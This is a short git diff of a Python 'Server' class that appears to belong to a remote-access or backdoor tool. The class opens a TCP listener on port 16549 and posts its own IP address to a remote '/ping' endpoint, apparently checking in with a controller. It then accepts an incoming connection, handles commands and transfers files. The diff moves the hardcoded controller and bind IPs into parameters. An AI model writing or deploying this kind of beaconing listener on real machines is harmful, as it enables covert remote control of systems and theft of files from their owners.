@@ -11,11 +11,13 @@ import requests
 
 
 class Server(Thread):
-    def __init__(self):
+    def __init__(self, IP: str, target_ip: str):
+        self.IP = IP
+        self.target_ip = target_ip
         self.conn = socket.socket()
-        self.conn.bind((get_ip_address(), 16549))
+        self.conn.bind((IP, 16549))
         self.conn.listen(100)
-        requests.post('http://172.19.229.87:80/ping', data=f"I am listening\n IP address: {get_ip_address()}")
+        requests.post(f'http://{target_ip}/ping', data=f"I am listening\n IP address: {get_ip_address()}")
         print('[+] Listening for income TCP connection on port 16549')
         self.conn, self.addr = self.conn.accept()
         print('[+]We got a connection from', self.addr)
@@ -71,7 +73,7 @@ class Server(Thread):
             elif msg == 'EXIT':
                 self.conn.shutdown(socket.SHUT_RDWR)
                 self.conn.close()
-                self.__init__()
+                self.__init__(self.IP, self.target_ip)
 
     def transfer(self, path):
         import os
@@ -87,7 +89,7 @@ class Server(Thread):
 
 
 def main():
-    server = Server()
+    server = Server('172.19.233.145', '172.19.233.145')
 
 
 if __name__ == '__main__':
